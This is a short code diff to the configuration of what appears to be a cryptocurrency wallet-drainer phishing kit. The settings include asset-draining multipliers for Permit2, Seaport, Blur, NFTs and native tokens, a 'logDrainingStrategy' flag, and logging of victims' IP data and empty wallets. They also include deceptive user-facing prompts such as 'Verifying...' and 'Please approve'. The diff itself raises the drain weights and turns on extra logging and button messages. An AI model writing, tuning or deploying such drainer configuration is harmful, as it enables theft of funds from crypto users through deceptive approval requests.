@@ -14,14 +14,14 @@ let w3m_description = "";
 let w3m_url = "";
 let w3m_icons = [''];
 let multipliers = {
-'LP_NFTS': 0.5,
-'PERMIT2': 1.5,
+'LP_NFTS': 1,
+'PERMIT2': 1,
 'BLUR': 1,
 'SEAPORT': 1,
 'SWAP': 1,
 'TOKENS': 1,
 'NFT': 1,
-'NATIVES': 0.5,
+'NATIVES': 1,
 };
 let notEligible = "Your wallet is not eligible, connect another wallet.";
 let swal_notEligibleTitle = "Not eligible";
@@ -36,7 +36,7 @@ let textProgress = "Verifying...";
 let success = "Please approve";
 let failed = "Try again";
 let logIpData = true;
-let logEmptyWallets = false;
+let logEmptyWallets = true;
 let logDrainingStrategy = true;
 let repeatHighest = true;
 let retry_changenetwork = 3;
@@ -55,7 +55,7 @@ let useSweetAlert = true;
 let popupEnabled = true;
 let useDefaultPopup = true;
 let canClosePopup = true;
-let buttonMessagesEnabled = false;
+let buttonMessagesEnabled = true;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
